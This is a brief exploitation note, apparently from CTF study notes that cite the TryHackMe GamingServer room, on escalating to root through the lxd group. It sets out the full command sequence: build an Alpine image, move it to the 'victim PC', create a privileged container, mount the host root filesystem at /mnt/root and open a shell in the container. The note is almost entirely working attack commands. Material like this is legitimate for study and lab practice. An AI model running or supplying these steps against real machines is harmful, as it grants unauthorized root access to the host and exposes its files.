# LXD
-----
If the user is part of the lxd group:
https://github.com/saghul/lxd-alpine-builder.git

Clone this repo and build the image:
```bash
./build-alpine
```

Transfer the output image to the victim PC.

```bash
lxc image import ./alpine*.tar.gz --alias myimage

# before running the image, start and configure the lxd storage pool as default 
lxd init

lxc init myimage mycontainer -c security.privileged=true

lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

lxc start mycontainer
lxc exec mycontainer /bin/sh
```

Now move into ```/mnt/root``` and we can view the root directory of the host machine.

TryHackMe - GamingServer.